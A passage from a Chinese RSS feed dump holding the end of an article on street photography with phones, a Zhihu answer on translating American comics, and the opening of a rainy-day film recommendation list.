alt=\"Joel Meyerowitz Retrospective at Kunst Haus Wien\"><figcaption>©Joel Meyerowitz</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/8973f083a0d7de6abc28de94ea5f1c3d\"><figcaption>©刘涛</figcaption></figure><p>街头摄影的美感就来自于讲故事。当你举起手机拍照时，如果把注意力都放在了「算法、合成、动态、夜景」等词汇上，每拍一两张就着急着看回放，就一定会忽略对画面内容本身的观察与捕捉，而这种做法恰恰是多数手机摄影爱好者的常态。这正是我想鼓励你尝试手机街头摄影的原因——让我们回到画面，回到摄影，去追寻那些更珍贵的东西。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/a5cb3e842a09b4e98476e7ccf259f83b.jpg\"><figcaption>使用 Xperia 1 III 拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/c699cd1584934968c2bdab364f0ca599.jpg\"><figcaption>使用 OPPO Find X3 Pro 拍摄</figcaption></figure><p>Xperia 1 III 的长焦镜头画质就谈不上好，尤其在环境照度较低的情况下，其画质衰减非常明显。但在我觉得合适的时候，我依然会用它来捕捉那些我来不及靠近的画面。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/0a8723dcae98a3ef84c00a9902b8cbd2.jpg\"><figcaption>使用 Xperia 1 III 拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/96104ec6138937b335030c26a252db3c.jpg\"><figcaption>使用 Xperia 1 III 拍摄</figcaption></figure><p>对于街头摄影来说，「拍到」的优先级永远大于「拍好」。以目前的手机影像发展来说，其在画质上仍和传统相机有着巨大差距，但我们之所以选择使用手机进行街头摄影，就是为了更方便地捕捉那些稍不留神就会错过的画面。</p>\n<h3>不要迷信「决定性瞬间」</h3>\n<p>「决定性瞬间」（The decisive moment）是个被过度解读和滥用的概念，但每当你搜索和街头摄影相关的文章及影片，这个词还是会反复出现。</p>\n<p>百度百科对于「决定性瞬间」的定义是这样的：</p>\n<blockquote><p>决定性瞬间，指摄影者在某一特定的时刻，将形式、设想、构图、光线、事件等所有因素完美地结合在一起。特指通过抓拍手段，在极短暂的几分之一秒的瞬间中，将具有决定性意义的事物加以概括，并用强有力的视觉构图表达出来。</p></blockquote>\n<p>这段描述释放了一个浓重的讯号——好照片需要依赖手快和好运气。当我们看到那些经典的街拍作品时，不免惊叹于画面里奇妙的巧合。再回看这段定义，自然也会愈加觉得「决定性瞬间」对于街拍格外重要。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/ac52a85aa4ef1fd78eee84e15ec96380.jpg\"><figcaption>使用 Xperia 1 III 拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/5f99edfd984c03df1514fb209551d2cf.jpg\"><figcaption>使用 iPhone 11 Pro Max 拍摄</figcaption></figure><p>然而，百度百科的定义是错误的，「决定性瞬间」的原意也并非如此。1952 年，Henri Cartier-Bresson 想要将自己的摄影作品集结出版，于是将画册定名为 <i>Images à la Sauvette</i>，并邀请野兽派画家 Henri Matisse（亨利·马蒂斯）为画册创作了封面。在法语中，「Images à la Sauvette」的大致意思为「偷偷摸摸、悄然拍摄的影像」，恰当地表现了 Cartier-Bresson 在拍摄时提前找好位置和角度，等待画面定格的状态。但在画册引入美国时，编辑 Deke Simon 却将画册改名为 <i>The Decisive Moment</i>，并解释说这个词来自于红衣主教 Cardinal de Retz 的一句话——There is nothing in this world that does not have a decisive moment（世间万物皆有其决定性瞬间）。Cartier-Bresson 对此很满意，于是认可并沿用了「决定性瞬间」这个概念。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/article/51e6a81e751ecdcf0afda066661125f3\" alt=\"Henri Cartier-Bresson, Images à la Sauvette (Verve, 1952), cover © Henri Cartier-Bresson / Magnum Photos\"><figcaption>Images à la Sauvette 首版封面，图片来自 henricartierbresson.org</figcaption></figure><p>相信你也看出来了，「决定性瞬间」的说法放在今天其实就是「标题党」，其诞生的起因只是图书编辑为了让画册更好卖。不过，这个说法确实精妙地概括了照片所能带给观众的惊奇感，以至于 Cartier-Bresson 在其后也开始使用这个词汇来解释自己的摄影理论。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/c1fce27576c0171c3145ac4c0ef61968.jpg\"><figcaption>©Nick Harvey</figcaption></figure><p>在实际拍摄中，「决定性瞬间」的出现并不是靠运气，而是靠对周围环境的观察和预判，以及精心的设计和谋划。某张精彩画面的背后，有可能是摄影师在同一位置数十次尝试拍摄后的结果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/029cfe56c5c336424291327d60a44706.jpg\"><figcaption>使用 Fujifilm X100V 拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/3741abbf6f7be82d11b1f891a8175c61.jpg\"><figcaption>使用 RICOH GR III 拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/5b89d99a00bea5fd0cb8f21e9391a914.jpg\"><figcaption>使用 Xperia 1 III 拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/474a9a7000a021aa5be372ab1b803a47.jpg\"><figcaption>使用 α6300 拍摄</figcaption></figure><p>有趣的是，街头摄影里最重要的技术「fishing」（字面意思为「钓鱼」，即选好画面和构图，等待关键人物或元素出现在画面里，国内摄影师常称之为「陷阱」）就是 Cartier-Bresson 发明并推广开来的。那些充满戏剧性的瞬间之所以能出现，固然需要一些运气，但更需要的是耐心、反复拍摄与后期选片。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/article/cdba46b549f721b7aeb895b5e5e40010\" alt=\"In Search of Brilliant Moments: Street Photography&amp;#39;s Heightened Existence -  Interview with Matt Stuart | By Alexander Strecker | LensCulture\"><figcaption>©Matt Stuart</figcaption></figure><p>运用 fishing 技巧拍摄到的最经典的照片之一，是英国摄影师 Matt Stuart 的这幅作品。为了拍摄到这个画面，Matt 举着相机在地上蹲了半个小时，直到鸽子以为他是环境中的一部分才肯安心落地，Matt 也最终拍到了这个如同鸽子和人并排行走的有趣画面。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/9c355fda5f45c7ce4bd2427ab8ce58a1.jpg\"><figcaption>使用 Xperia 1 III 拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/4cb99f28f3879ee577891a8e3246c64e.jpg\"><figcaption>使用 α6300 拍摄</figcaption></figure><h3>别怕重复和试错</h3>\n<p>街头摄影圈流行的另外一句话来自 Alex Webb，这句话是「Street photography is 99% about failure」（99% 的街头摄影都是失败的）。Alex 说这句话的意思不是批评你的作品拍得不好，而是想强调重复和试错的重要性。</p>\n<p>街头摄影的成片率很低，尤其当你想要在每次拍摄之后选出最好的作品时。在选定一个最佳角度之后，摄影师往往需要拍摄少则四五张、多则几十张照片，才能从中选到人物的位置和状态最令人满意的作品，这其实也再一次说明「决定性瞬间」的出现需要依靠耐心和尝试。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/3c7a1e868d0e84709671783ece84d2a2.jpg\"><figcaption>使用 α6300 拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/663b4535bb9903a0f37983377557fca5.JPG\"><figcaption>使用 iPhone 拍摄</figcaption></figure><p>在 <i>Street Photographer's Manual</i> 这本书中，作者 David Gibson 展示了自己的选片过程。在众多候选照片里，他先粗筛出了五六张照片，然后再注意排查小朋友们的姿态和表情，最终从中选定了最平衡的一幅。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/659dd9bf3f1b193e15ab1f8347d884ff.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/a1d5e08e0115c5aad19daf28044ec8e1.jpg\"></figure><p>在胶卷时代，摄影师们会利用 contact sheets 来进行照片筛选。Contact sheets 是一种底片册，摄影师将洗好的底片借助放大机「复印」成册，然后经过反复对比，勾选出自己满意的作品，再将之做出成品。到了数字照片时代，人们已经不需要这样来筛选照片，但 contact sheets 依然存在，它就是 Lightroom 里出现频率最高的照片预览（Photo Grid）介面。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/addd2b969c5ca31d61329b64de5fee8a\" alt=\"Magnum Contact Sheets | International Center of Photography\"><figcaption>这可能是全球知名度最高的 contact sheet 之一了，收录了革命领袖 Che Guevara（切·格瓦拉）的众多神态，拍摄者是瑞士摄影师 Rene Burri</figcaption></figure><p>手机摄影爱好者通常已经习惯了「随拍随走」的拍照模式，遇到想拍的内容就蜻蜓点水地按两下快门，挑片时也直接从相册里选够九张、后期一下，然后就发到朋友圈。但如果你想让自己的作品更进一步，这样的拍摄模式就太过浅显。手机摄影也是摄影，我们要以摄影的方式拍片和选片。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/04049af9cd0a72ac0f33a802635ae065.jpg\"><figcaption>相册就是最简单的 contact sheet</figcaption></figure><p>我们再来看看 Alex Webb 的原话吧：</p>\n<blockquote><p>Luck – or perhaps serendipity – plays a big role… But you never know what is going to happen. And what is most exciting is when the utterly unexpected happens, and you manage to be there at the right place at the right time – and push the shutter at the right moment. Most of the time it doesn’t work out that way. This kind of photography is 99.9% about failure.</p></blockquote>\n<blockquote><p>运气——或者说好运气——（对于街头摄影而言）起着很大的作用，但你永远不知道会发生什么。当「意外」发生时，你能想方设法在正确的时间和地点出现，并在正确的时机按下快门，这是最令人兴奋的事。但大多数时候，事情却没这么顺利，这种摄影（注：指街头摄影）99.9 % 都是关于失败的。</p></blockquote>\n<p>所以，即使你拍了一天却一张好照片都没拍到，请别气馁——这是街头摄影的常态。你对世界的观察力和拍摄能力会随着拍照数量的增加而不断提升，它们比成片更为宝贵。</p>\n<h2>第四章：想要学好街头摄影，这些素材帮你精进</h2>\n<p>文章进行到这里，你会发现我对纯摄影技术的着墨不多，原因其一是文章开头提到的陳川端老师的文章已经足够优秀，而且我派也有大量关于手机摄影的技术向文章可读，无需我再赘述；其二是在街头摄影里，走上街头、持续按快门的坚持和努力比单纯地提升技术重要得多，本文中给出了大量经典作品作为案例，其目的就是激发你的拍摄冲动，并给予你参考和灵感。</p>\n<p>不过，如果你想认真提升街头摄影的素养，依然有很多素材可以学习。在本文的最后一个部分，我列举了一些经过我验证或学习、确实可以帮到你的学习素材，帮你在街头摄影这条道路上更进一步。</p>\n<h3>The Americans by Robert Frank</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/article/41c0dd1105c71fa6b719d32e21d9d9ff\" alt=\"The Americans: Frank, Robert, Kerouac, Jack: 9783865215840: Amazon.com:  Books\"><figcaption>图片来自 amazon.com</figcaption></figure><ul><li>类型：画册</li></ul>\n<p>这是一本影响了摄影史的画册，也是一本神奇的画册。在 Robert Frank 拍摄这本画册之前，整个摄影界对「美」的定义几乎都来自 Cartier-Bresson——构图、秩序、精巧的设计、充满叙事张力的画面等，但 <i>The Americans</i> 里表现出的人物状态却随性、自然，许多照片看上去也没什么美感，甚至没什么主题。但正是这种拍摄手法将摄影术第一次从对绘画的模仿中剥离，开始延展出属于摄影专属的创作方式。</p>\n<p><i>The Americans</i> 影响了无数街头摄影师的创作，当你随便打开某位大师的访谈，几乎可以很容易就听到这本画册影响了他的创作的故事。我在第一次翻看 <i>The Americans</i> 时也一度有些困惑于 Robert Frank 看似随性的创作手法，但合上书页之后，那些影像久久停留在我的脑中，如同有某种神秘的魔力。事实上，<i>The Americans</i> 里的八十多张照片是从超过两万八千张底片里选出的，他们实际呈现的内容和意义远非看上去那么简单。</p>\n<h3>Street Photographer's Manual</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/3ebb6192e4dd73c7e554062254937043.jpg\"></figure><ul><li>类型：图书</li></ul>\n<p>上文提到的 <i>Street Photographer's Manual</i> 是目前市面上关于街头摄影最系统的说明性手册，而且不同于大多数摄影教材讲参数、讲理论的内容模式，<i>Street Photographer's Manual</i> 主要内容是关于街头摄影题材、构图和创意方面的探讨，目的是让你读完之后知道自己如何提高，该拍什么。</p>\n<p>这本书的编排也很出色，全书除了分为数个章节阐述摄影技巧外，还在每个章节之间穿插了对知名街头摄影师的生平介绍，并附上了他们的经典作品。这样的编排对摄影学习者而言非常友好，在掌握理论的同时，还能直接观看成熟摄影师的标志性作品，从而也对作者意图更为了解。</p>\n<p>这本书目前没有中文译本，如果大家想了解本书内容的话，未来可以考虑在会员读书专栏里专门聊聊。</p>\n<h3>52 Assignments: Street Photography</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/ce5b17d36f0dc3471a8d20ff17f6a903.jpg\"></figure><ul><li>类型：图书</li></ul>\n<p>本书在上文也有出现，大陆版名为《街头摄影：52 个任务清单》。如前文所言，这本书的核心内容就是 52 个不同的摄影主题，你需要跟着作者给你的任务完成拍摄，在「执行任务」的过程中，你的各项拍摄和观察能力也会得到锻炼。</p>\n<p>这本书的优点就在于任务十分明确，每个任务对读者的训练也很直接。譬如其中的主题之一「阴影」，在你拍摄时，注意力就要放在各种影子上，对于时间、光线、角度的把控也在这个过程中得到了提升。</p>\n<p>书中还有一些很有趣的挑战，譬如「一条街，一卷胶卷，一天」这个主题，要求你在一天时间内只用一卷胶卷（也就是 36 张或者 24 张）进行拍摄，并且只能拍摄一条街道。这其实是对摄影者综合素质的极大考验，使用胶卷相机也意味着你要手动完成所有参数设定，而仅仅二三十张的限制则对你的观察力和把握时机的能力有着很高的要求。当你能把书中的任务都「打通关」，从摄影技术到综合能力一定都能获得焕然一新的面貌。</p>\n<h3>森山大道，我的写真全貌</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/2b5a90a7bde4880b474adc5d6c92af23.jpg\"></figure><ul><li>类型：图书</li></ul>\n<p>森山大道这个名字在国内早已突破了摄影的范畴，成了和 <a href=\"https://zh.wikipedia.org/wiki/%E5%9D%82%E6%9C%AC%E9%BE%8D%E4%B8%80\" target=\"_blank\">坂本龙一</a> 一样的「文化网红」。每当人们看到高对比黑白照片，都会忍不住说一句「这很森山大道」。但事实上，很少有人真正了解森山大道其人及其作品，把高对比黑白笼统地称为「森山大道风格」也是不负责任的误读。</p>\n<p>这本《森山大道，我的写真全貌》就是森山大道与诸多摄影师的对谈以及个人自述，与他对谈的荒木经惟、吉田修一、中平卓马等都是日本摄影界的大师级人物。除了谈街头摄影，森山大道还在书中谈及了大量和艺术创作有关的内容，阅读这本书所能收获的不是摄影技巧，而是艺术理念。</p>\n<p>森山大道对中国摄影界的影响很大，除了这本「写真全貌」外，市面上和他相关的书籍和资讯也很多，可以相对容易地完整了解他的创作理念和经历，进而脱离部分网民对他的追捧和盲从。我个人其实对日本摄影师了解甚少，可但凡学习街头摄影，森山大道都是绕不开的人物，这本书也是我读过为数不多的和日本摄影师相关的作品。</p>\n<p>本书没有简化字版本，唯一的中译本是台版，所以如果你此前没有读竖排书的经验，阅读此书时就得适应适应啦。</p>\n<h3>StreetSnappers</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/9e7c9a4d890f5bcca0d239416531c0bb.png\"></figure><ul>\n<li>类型：YouTube 频道</li>\n<li>入口：<a href=\"https://www.youtube.com/c/StreetSnappers/about\" target=\"_blank\">点击这里</a>\n</li>\n</ul>\n<p>StreetSnappers 是由摄影师 Brian Lloyd Duckett 创办的街头摄影主题频道，而 Brian 就是上面那本《街头摄影：52 个任务清单》的作者。StreetSnappers 是我最推荐的街头摄影频道，Brian 在影片里介绍了关于街头摄影相关的诸多技巧，看完之后就足以入门。</p>\n<p>除了传授街头摄影知识，Brian 还会定期更新 Q&amp;A 和作品评论，解答观众的疑问并点评近期他拍摄或看到的街头摄影作品。这个频道就像一本紧跟时下进程的教科书，每次翻开都有收获。</p>\n<h3>Joel Meyerowitz: Photography Course with a Master</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/cdd58920660d1ce233f8881c1f982dee.png\"></figure><ul>\n<li>类型：在线课程</li>\n<li>入口：<a href=\"https://mastersof.photography/joel-meyerowitz/\">点击这里</a>\n</li>\n</ul>\n<p>关于街头摄影的影片课程整体不算多，Joel Meyerowitz 的这套大师课是我觉得难得有「真东西」的大师课。Joel Meyerowitz 的表达能力特别强，所以我对他个人的关注和喜爱甚至超过了的作品。Joel 的大师课不是面向新人的「来，我手把手带你拍」，但在课程里讲解了他观察、选题、思考的方式，并不空谈。学完整个课程，可以获得摄影技术和思想的双重提升。</p>\n<p>Joel Meyerowitz 的这套大师课不便宜，完整版的价格已经足够一些国内摄影师工作坊的入门价了，但 Joel Meyerowitz 所能传递的讯息是其他摄影师轻易难以企及的，所以依然值回票价。这个品牌旗下还有几门大师课，尤其 <a href=\"https://mastersof.photography/steve-mccurry/\">Steve McCurry 的课程</a> 里也包含了大量街头摄影内容。如果能与 Joel Meyerowitz 的课程质量相匹配，那也相当不错。</p>\n<h2>最终章：总结</h2>\n<p>读到这里，你可能会发现这篇文章和你看过的「手机影像测评」类文章大有不同，和其它摄影类文章也不一样。的确，我希望通过这篇文章带给你重新审视手机摄影的方式。正如文中所言，当代大部分年轻人可能都是通过手机摄影来了解摄影本身的，这个过程里不免受到来自厂商和测评人错误的引导，对摄影的感受也产生了偏差。我想做一点小小的努力，尝试带你回到摄影本身。</p>\n<p>所以，我在文中大量穿插了成熟的摄影师作品和我个人拍摄的小片——让我们不比样张、不比夜景、不比噪点和算法，把目光聚焦在画面上。文中引用的摄影作品既有大师之作，也有名气不那么大但拍得非常好的「不知名摄影师」的作品，希望这些来自不同角度、不同风格的作品能带给你灵感和启示。</p>\n<p>此外，文中引用的作品经过摄影师通过公开渠道正式发表，如果你对更多作品感兴趣，可以搜索对应摄影师的名字，他们通常都有个人网站或社交媒体账号，那里有更多好作品等你欣赏。</p>\n<p>拍照愉快！</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67611"},{"title":"翻译漫画有哪些需要知道的要点或技巧？","date":"2021-07-18 04:00:09","description":"\n<p>看了大部分回答都是讲日本漫画的，我从美漫汉化的角度讲一些经验吧：</p>\n<hr>\n<p><b>1. 注意语句通顺</b></p>\n<p>很多想加入汉化组当翻译的小伙伴第一句问的就是“需要六级几分？”实际上从我个人的经验来看，相比英文水平，更重要的是中文水平。英语看不懂，借助查字典甚至机器翻译，大部分的意思都能搞懂。但是，把它变成一句读起来通顺流畅的中文，并没有想象中的那么容易。</p>\n<p>有一次我做校对，那个译文我真的是一个字都没看懂，仿佛古神的低语……汉化组嘛，大家都是用爱发电，也不好意思说什么，最后我受不了了，直接从头到尾重新翻译了一遍。所以，翻译出来之后自己先把译文读一遍，先确保读者能看懂，再说其他的。</p>\n<p>在这里我给大家提供两个英文翻译成中文的小窍门：第一是把复杂句的从句拆出来变成简单句，第二是把被动句改为主动句并且补上主语。这两个小窍门可以在很多情况是解决“把英文表达方式转换为中文常见的表达方式”的捷径。当然了，这两个小窍门也不是时时都能用，因为在不同的场景和语气下，台词所需要强调的内容可能跟这些语法有关系，这个就要具体情况具体理解了。</p>\n<hr>\n<p><b>2. 注意用语场景</b></p>\n<p>说到这里也想吐槽一下好多人的一提到翻译脑子里就冒出“信达雅”，一堆大白话被翻译成自以为高雅的文白夹杂的“古风”还被盲目追捧，我看起来实在浑身尴尬。漫画里很多表达就是口语，翻译成大白话，简单直接就行了。</p>\n<p>当然，这就涉及到人物语气的问题，也有一些小窍门跟大家分享：如何让译文看起来更像口语？从自己生活日常的语言来取材！例如，把“我们”换成“咱们”，把“什么”换成“啥”，把“小时”换成“钟头”等等。不过，这就引出了另一个问题：中文里很多口语化的表达其实是带有地方性或者说方言色彩的，比如儿化音，“外婆”和“姥姥”之间的区别等等。这时候就出现了一条很微妙的线：“接近中文口语化”和“听起来像四川/东北/天津/xx人”之间的区别到底在哪？读者体验又会是什么样？</p>\n<p>我个人的追求还是更接近“异化”，让读者体验到原文的语境，所以我的习惯是尽量少用成语，少用方言，少用带中文典故的词，少用中文网络流行语。当然了，这个就是翻译理念的区别了，也有喜欢追求“归化”的译法，这就见仁见智了。翻译是一种再创造，很多情况下需要译者自己把握这条界限，也需要多听取读者的反馈，不断调整自己的做法，这个说起来话题就大了，需要大家自己多学习，多训练，形成自己的风格。</p>\n<hr>\n<p><b>3. 注意语言的韵律感和节奏感</b></p>\n<p>这一点其实是难度颇大的，主要是因为在英文中，很多词在口语和书面语中是通用的；或者换个方式说，英文的口语词并不一定就会显得“俚俗”。而同样意思的中文词，却又往往口语词只在口语中用，而书面语完全是另一个词，这时候再试图追求原文的韵律或者节奏，要么像打油诗或者rap，要么就掉进前文说的“古风”陷阱。这一点其实我个人也没有什么完全的解决办法，只能建议大家根据具体情况具体分析，同时要去熟悉一些英文文学中比较特有的行文方式：例如押头韵、不同抑扬格的格式等等。首先别把这些东西漏了，之后就看译者的功力了。当然假如实在翻译不出原文的韵律，也不必灰心，这本身就是很难的事。把意思翻译出来，加个注释把原文的特殊格式解释给读者也不失为一个选择。</p>\n<hr>\n<p><b>4. 漫画语言的特点</b></p>\n<p>上面三点其实对于很多通俗作品都适用，同时，漫画这个媒介本身有自己的特点。比如：</p>\n<p>a. 对话框的大小已经被原文固定了，所以，翻译出来的中文内容，最好能根据需要调整长度，达到占用的空间能和英文内容差不多，这样子填字后看起来更加美观。</p>\n<p>b. 注意翻页的悬念：漫画里最常见的一种创作手法是，把一句完整的话分成两部分，前一半在翻页之前的最后一个旁白框/对话框，后一半在翻页之后的第一个旁白框/对话框；或者说“翻页前提出问题，翻页后给出答案”这样制造悬念，吸引读者翻页的做法。这时候要特别注意，因为许多英文句子很可能是要调换个顺序，中文才更通顺，这时候或许就跟要制造的悬念冲突了。这也就是我上文提到的复杂句改简单句/被动句改主动句的时候往往不适用的地方。这时候怎么翻译，就看出译者的功夫来了，很多情况没有一个通用原则，需要大家自己多尝试，提高自己的水平。</p>\n<p>c. 填字时候的要点：其实各个汉化组自己都有一些相应的填字规则，我大概说一下自己喜欢的用法吧。</p>\n<p>首先，尽量用半角标点符号，因为全角符号会导致空出半个格子，在对话框里很扎眼；</p>\n<p>其次，填出来的段落形状尽量符合对话框的形状，例如椭圆形对话框，就把段落填成中间一行最长，往上往下每行都逐步缩短，这样把段落形成一个椭圆形，读起来观感佳；</p>\n<p>第三，一个词中间尽量不断行，读者阅读更舒适；</p>\n<p>第四，中文没有原生的斜体，所以原文的如果有斜体，到了中文最好换一种强调方式，因为中文的斜体实在是太难看了；</p>\n<p>第五，我个人比较喜欢在普通对话框里使用无衬线字体，比如微软雅黑、黑体等等。在我看来，这种用法比较接近美漫中绝大多数对话框采用大写字母的意图：在小空间内使用尽量简洁整齐的填字方式，更易读。</p>\n<hr>\n<p>另外，我看到其他许多回答说的“要注意俚语、术语和特殊表达方式”等等，其实我觉得这个是翻译的基础要求，就是“弄懂原文”，这个都没做到的话，其他一切都无从谈起。所以我并不特别强调这个，因为我觉得只要是认真的译者，都会把可能出现的、自己不明白的表达方式都给查清楚了，再开始翻译。看不懂别硬翻，多查多问。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/xiao-yao-81-38?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">肖尧</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/351873262/answer/2003865793?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">5 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/312024044?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">日文原版漫画到哪里去买？</a><br><a href=\"http://www.zhihu.com/question/368229455?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">有哪些好的漫画适宜睡前阅读？</a><br>\n","link":"http://www.zhihu.com/question/351873262/answer/2003865793?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"看什么 · 特别篇丨让这张雷雨季的专属片单，来带你清凉一夏","date":"2021-07-18 03:07:03","description":"\n<h2>导语</h2>\n<p>苦烈日下蝉鸣嘒嘒久矣，很想听一场暴雨的声音。华北地区的强降雨还在继续，住在南方的朋友们有下雨吗？本期「看什么」雨天主题特辑，希望能在七月盛夏帮大家洗去燥热、带来清凉！</p>\n<p>本片单共 12 部影视作品，按照「降雨量」和「清凉度」从高到低排序，大都是发生在雨天的温馨故事，或亲情，或友情，或爱情，还有富有诗意的纪录短片。提到「雨天」<strong>你会最先想起哪部作品？</strong>在清凉雨天你<strong>有什么一定要做的事？</strong>欢迎在评论区和我们一起讨论🙋！</p>\n<p>之后每个月「看什么」栏目都会推出不同主题的特辑，关注每周新片的同时，也和大家一起回顾过往经典。</p>\n<h2>TL;DR</h2>\n<ul>\n<li>[动画] 言叶之庭、[动画] 天气之子、[动画] 恋如雨止</li>\n<li>🔦 [电影] 雨 Lluvia、[纪录] 雨 Regen、[动画] 少女终末旅行</li>\n<li>[电影] 借着雨点说爱你、[电影] 比海更深</li>\n<li>[电影] 雨中曲、[电影] 时空恋旅人、[电影] 不能说的秘密、[电影] 如晴天 似雨天</li>\n</ul>\n<p>根据读者反馈，如果推荐语涉及剧透（对故事核心、暗线、伏笔、结局等关键要素的透露），我们会在对应作品的标题前增加 🔦 的 Emoji。</p>\n<p>如果你喜欢我们的内容，希望它持续更新，或是有任何建议，就请留言和充电吧~ 你们的支持将是我们的重要动力！</p>\n<hr>\n<h2>[动画] 言叶之庭</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/e47ae22d9d558b2e149a33f95d5c98af.png\"></figure><p>关键词：爱情 / 动画</p>\n<p>片长：46 分钟</p>\n<p>观看渠道：<a href=\"https://www.bilibili.com/bangumi/play/ep63669?bsource=douban\" target=\"_blank\">哔哩哔哩</a>；<a href=\"https://movie.douban.com/subject/20470074/\" target=\"_blank\">豆瓣链接</a></p>\n<blockquote><p>隐约雷鸣，阴霾天空，但盼风雨来，能留你至此。</p></blockquote>\n<p>降雨量：★★★★★ 清凉度：★★★★☆</p>\n<p>@Voyager_1 ：初看《言叶之庭》的时候，还以为这部影片同《秒速五厘米》一样描绘的是小情侣间的暗恋情愫。直到剧中不间断的小雨淅沥、大雨滂沱，年方 15 岁的高中生秋月孝雄在绿意盎然的庭院中遇见喝啤酒吃巧克力的古文老师雪野百香里时，我才知道故事并非如此。</p>\n<p>年轻的秋月虽然心有寄托，但他知道现实和理想的差距，他想用自己做鞋的才能为雪野做一双鞋。六月的雨，淅淅沥沥，此时的秋月独自打工、做鞋，会逃课去一座安静的小亭子里，呼吸久违的「天空的气味」。镜头切换，一路雨滴在水中泛起的涟漪，脚边投射出天空倒影的水洼，配上男女主吟诵出的这两句短歌「隐约雷鸣，阴霾天空，即使天无雨，我亦留此地」，无论从哪个角度来说，动画中描绘的雨都比现实更有诗意。</p>\n<p>随着时间的推移，雨却没有停下的意思，虽然有梅雨季节的借口掩盖，但显然新海诚的雨是主角心中雨的蔓延，若是心中有雨，即使天晴下来，也会期盼下雨。因为雨中有一人相等，会分享便当，畅聊说不出口的梦想。雨季尾声的最后一个拥抱，由秦基博演唱的《Rain》推向高潮，镜头推移，雨后彩虹出现，所有的心事都已不动声色，无以言表。</p>\n<h2>[动画] 天气之子</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/6e4dc12469a7f01e0bfbb5c7a282464e.png\"></figure><p>关键词：爱情 / 动画 / 奇幻</p>\n<p>片长：112 分钟</p>\n<p>观看地址：<a href=\"https://www.bilibili.com/bangumi/play/ss33343/?from=search&amp;seid=13014596754983575796\" target=\"_blank\">哔哩哔哩</a> / <a href=\"https://v.qq.com/x/cover/mzc00200fk7ihvs/e0034fipmex.html\" target=\"_blank\">腾讯视频</a> / <a href=\"https://www.iqiyi.com/v_19rueobmj8.html\" target=\"_blank\">爱奇艺</a> / <a href=\"https://v.youku.com/v_show/id_XNDY5NjIzMTE0MA==.html?spm=a2h0c.8166622.PhoneSokuProgram_1.dposter&amp;s=60c40195ce43473f8ae1\" target=\"_blank\">优酷</a> / <a href=\"http://www.le.com/ptv/vplay/67927471.html\" target=\"_blank\">乐视</a>；<a href=\"https://movie.douban.com/subject/30402296/\" target=\"_blank\">豆瓣链接</a></p>\n<p>降雨量：★★★★★ 清凉度：★★★★☆</p>\n<blockquote><p>比起晴天，我更需要阳菜。</p></blockquote>\n<p>@潘誉晗 